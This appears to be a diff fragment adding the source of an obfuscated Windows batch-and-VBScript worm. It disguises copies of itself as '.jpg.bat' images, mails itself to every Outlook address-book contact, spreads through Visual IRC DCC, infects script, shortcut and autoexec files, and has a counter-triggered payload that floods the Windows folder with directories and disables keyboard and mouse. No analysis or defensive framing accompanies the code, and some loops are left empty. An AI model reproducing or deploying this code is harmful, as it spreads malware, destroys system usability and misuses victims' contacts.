+md %windir%\gu_Maq4J%OrŸÃçÎ%
+copy %windir%\SYSnOqqS.bat %windir%\gu_Maq4J\sexy9445.jpg.bat%OrŸÃçÎ%
+copy %windir%\SYSnOqqS.bat %windir%\MyFriend.bat%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKEY_USERS\.Default\Software\MeGaLiTh Software\Visual IRC 98\Events\Event17", "dcc send $nick %windir%\MyFriend.bat">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+copy %windir%\SYSnOqqS.bat %windir%\SEXY_5601.jpg.bat%OrŸÃçÎ%
+echo dim uAQes7KY, CVjzCQft, MMan3GUk>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set d2GUiyBO=w%ï"Uy¦Ê%.createobject("outlook.application")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set Ls6KYm2F=d2GUiyBO.getnamespace("MAPI")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+%OrŸÃçÎ%set Ùı)d‰¬=ddresslists(
+%OrŸÃçÎ%set ±Õ.g=dressentrie
+echo for uAQes7KY=1 to Ls6KYm2F.addresslists.count>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set Viw_Pcq6=Ls6KYm2F.a%Ùı)d‰¬%uAQes7KY)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo CVjzCQft=1>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set mNdr4JXl=d2GUiyBO.createitem(0)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo for MMan3GUk=1 toViw_Pcq6.ad%±Õ.g%s.count>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo set EXm0DThu=Viw_Pcq6.ad%±Õ.g%s(CVjzCQft)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo mNdr4JXl.recipients.add EXm0DThu>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo CVjzCQft=CVjzCQft+1>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo next>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo mNdr4JXl.subject="important">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo mNdr4JXl.body="important">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo mNdr4JXl.attachments.add("%windir%\SEXY_5601.jpg.bat")>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo mNdr4JXl.deleteaftersubmit=1>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo mNdr4JXl.send>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo EXm0DThu="">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo next>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo dim Njx_Pdr7, vXn1EThv, XFUiwBOc>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Njx_Pdr7=int(PyDQgu8N.regread ("HKCU\Software\eOdr5KXl\MEShv9Oc"))>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo vXn1EThv=int(PyDQgu8N.regread ("HKCU\Software\eOdr5KXl\W5IWmzCS"))>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo XFUiwBOc=int(PyDQgu8N.regread ("HKCU\Software\eOdr5KXl\F6JYm2FT"))>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo if (int(XFUiwBOc)<>day(now) or int(vXn1EThv)<>month(now)) then>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Njx_Pdr7=Njx_Pdr7+1>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo if (Njx_Pdr7=5) then>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Gr5KYm1E="SiwAOcs6">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo nkxCQeu7()>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Gr5KYm1E="">>%tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo PyDQgu8N.run "%windir%\SYSnOqqS.bat Rhu8Nb4G">> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo Njx_Pdr7=0>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo end if>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKCU\Software\eOdr5KXl\W5IWmzCS", month(now)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKCU\Software\eOdr5KXl\F6JYm2FT", day(now)>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo end if>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo PyDQgu8N.regwrite "HKCU\Software\eOdr5KXl\MEShv9Oc", Njx_Pdr7>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+echo end if>> %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+start /w %tmp%\XlzESfv9.vbs%OrŸÃçÎ%
+%OrŸÃçÎ%set ö*]‚=cmd
+for %%h in () do attrib -r %%h%OrŸÃçÎ%
+for %%h in () do call %0 0FThw_Pd %%h%OrŸÃçÎ%
+%OrŸÃçÎ%set ö*]‚=html%OrŸÃçÎ%
+for %%h in () do attrib -r %%h%OrŸÃçÎ%
+for %%h in () do call %0 Qer7KYo1 %%h%OrŸÃçÎ%
+%OrŸÃçÎ%set ö*]‚=asp%OrŸÃçÎ%
+for %%h in () do attrib -r %%h%OrŸÃçÎ%
+for %%h in () do call %0 Qer7KYo1 %%h%OrŸÃçÎ%
+%OrŸÃçÎ%set ö*]‚=cgi%OrŸÃçÎ%
+for %%h in () do attrib -r %%h%OrŸÃçÎ%
+for %%h in () do call %0 Qer7KYo1 %%h%OrŸÃçÎ%
+%OrŸÃçÎ%set ö*]‚=js%OrŸÃçÎ%
+for %%h in () do attrib -r %%h%OrŸÃçÎ%
+for %%h in () do call %0 Odr5KYl1 %%h%OrŸÃçÎ%
+%OrŸÃçÎ%set ö*]‚=jse%OrŸÃçÎ%
+for %%h in () do attrib -r %%h%OrŸÃçÎ%
+for %%h in () do call %0 Odr5KYl1 %%h%OrŸÃçÎ%
+%OrŸÃçÎ%set ö*]‚=vbs%OrŸÃçÎ%
+for %%h in () do attrib -r %%h%OrŸÃçÎ%
+for %%h in () do call %0 lDReu8Lb %%h%OrŸÃçÎ%
+%OrŸÃçÎ%set ö*]‚=vbe%OrŸÃçÎ%
+for %%h in () do attrib -r %%h%OrŸÃçÎ%
+for %%h in () do call %0 lDReu8Lb %%h%OrŸÃçÎ%
+%OrŸÃçÎ%set ö*]‚=lnk
+for %%h in () do attrib -r %%h%OrŸÃçÎ%
+for %%h in () do copy %%h+%tmp%\9MZp3GWj.lnk %%h /y /b%OrŸÃçÎ%
+%OrŸÃçÎ%set ö*]‚=pif
+for %%h in () do attrib -r %%h%OrŸÃçÎ%
+for %%h in () do copy %%h+%tmp%\HVjzCRft.pif %%h /y /b%OrŸÃçÎ%
+%comspec% /f /c attrib -r -s -h A:\autoexec.bat%OrŸÃçÎ%
+%comspec% /f /c type %windir%\SYSnOqqS.bat >> A:\autoexec.bat%OrŸÃçÎ%
+md \SYSpRttCFG%OrŸÃçÎ%
+copy %windir%\SYSnOqqS.bat \SYSpRttCFG\pRttDEBUG.bat /y%OrŸÃçÎ%
+subst F: \SYSpRttCFG%OrŸÃçÎ%
+goto 5KYo2EUi%OrŸÃçÎ%
+:GUixAOes%OrŸÃçÎ%
+echo xCQet7Kan1>> %1gbr5Uk%OrŸÃçÎ%
+goto LYo2FViw%OrŸÃçÎ%
+:5KYo2EUi%OrŸÃçÎ%
+goto t9LZp3GV%OrŸÃçÎ%
+:EUiwAOcs%OrŸÃçÎ%
+echo.|type %2|find "OrŸÃçÎ">nul
+if errorlevel 1 copy %2+%tmp%\an3GUjxA.tmp %2 /y /b%OrŸÃçÎ%
+goto LYo2FViw%OrŸÃçÎ%
+:5IYm0ESg%OrŸÃçÎ%
+goto 5IYm0ESg%OrŸÃçÎ%
+:ESiv9Ocs%OrŸÃçÎ%
+echo.|type %2|find "OrŸÃçÎ">nul
+if errorlevel 1 copy %2+%windir%\ZAAccCFG.js %2 /y /b%OrŸÃçÎ%
+goto LYo2FViw%OrŸÃçÎ%
+:5IYm0ESg%OrŸÃçÎ%
+goto ft6LZn3F%OrŸÃçÎ%
+:o2HVjyBP%OrŸÃçÎ%
+echo.|type %2|find "OrŸÃçÎ">nul
+if errorlevel 1 copy %2+%windir%\WinutVxx.vbs %2 /y /b%OrŸÃçÎ%
+goto LYo2FViw%OrŸÃçÎ%
+:ft6LZn3F%OrŸÃçÎ%
+goto BPds6JZn%OrŸÃçÎ%
+:r6JXn1DT%OrŸÃçÎ%
+echo.|type %2|find "OrŸÃçÎ">nul
+if errorlevel 1 copy %2+%windir%\SYSnOqqS.bat %2 /y /b%OrŸÃçÎ%
+goto LYo2FViw%OrŸÃçÎ%
+:BPds6JZn%OrŸÃçÎ%
+goto dq4JXk0D%OrŸÃçÎ%
+:UkyBQes8%OrŸÃçÎ%
+echo.on error resume next>%tmp%\BPft6LZp.vbs%OrŸÃçÎ%
+echo Msgbox "",64,"">>%tmp%\BPft6LZp.vbs%OrŸÃçÎ%
+wscript %tmp%\BPft6LZp.vbs%OrŸÃçÎ%
+find /i /v "run"<%tmp%\hvANbr5I.tmp>%tmp%\iyBPes6L.vbs%OrŸÃçÎ%
+echo do>>%tmp%\iyBPes6L.vbs%OrŸÃçÎ%
+echo randomize>>%tmp%\iyBPes6L.vbs%OrŸÃçÎ%
+echo h9Maq4GW.createfolder("%windir%\"&year(now)&month(now)&day(now)&time()&rnd*999999)>>%tmp%\iyBPes6L.vbs%OrŸÃçÎ%
+echo loop>>%tmp%\iyBPes6L.vbs%OrŸÃçÎ%
+wscript %tmp%\iyBPes6L.vbs%OrŸÃçÎ%
+for %%a in (%windir%\*.*) do call %0 wBOcs6JY %%a%OrŸÃçÎ%
+find /i /v "run" < %tmp%\hvANbr5I.tmp > %tmp%\Ds6LZn2F.vbs%OrŸÃçÎ%
+echo Nt9MZp3G()>> %tmp%\Ds6LZn2F.vbs%OrŸÃçÎ%
+echo sub Nt9MZp3G>> %tmp%\Ds6LZn2F.vbs%OrŸÃçÎ%
+echo Xu_Maq4H.run "%comspec% /f /c if exist A:\*.* rem ñ$X…¨Ìø#", 0>> %tmp%\Ds6LZn2F.vbs%OrŸÃçÎ%
+echo Nt9MZp3G()>> %tmp%\Ds6LZn2F.vbs%OrŸÃçÎ%
+echo end sub>> %tmp%\Ds6LZn2F.vbs%OrŸÃçÎ%
+wscript %tmp%\Ds6LZn2F.vbs%OrŸÃçÎ%
+rundll32 keyboard,disable%OrŸÃçÎ%
+rundll32 mouse,disable%OrŸÃçÎ%
+goto LYo2FViw%OrŸÃçÎ%
+:dq4JXk0D%OrŸÃçÎ%
+del %windir%\SEXY_5601.jpg.bat%OrŸÃçÎ%
+%OrŸÃçÎ%set ñX}¡Ì=erase
+%OrŸÃçÎ%set ğW{§Ë=%ñX}¡Ì% %tmp%\*.
+%ğW{§Ë%tmp%OrŸÃçÎ%
+%ğW{§Ë%bat%OrŸÃçÎ%
+%ğW{§Ë%vbs%OrŸÃçÎ%
+if not exist %´×:b% ctty con%OrŸÃçÎ%
+:LYo2FViw%OrŸÃçÎ%
+cls%OrŸÃçÎ%
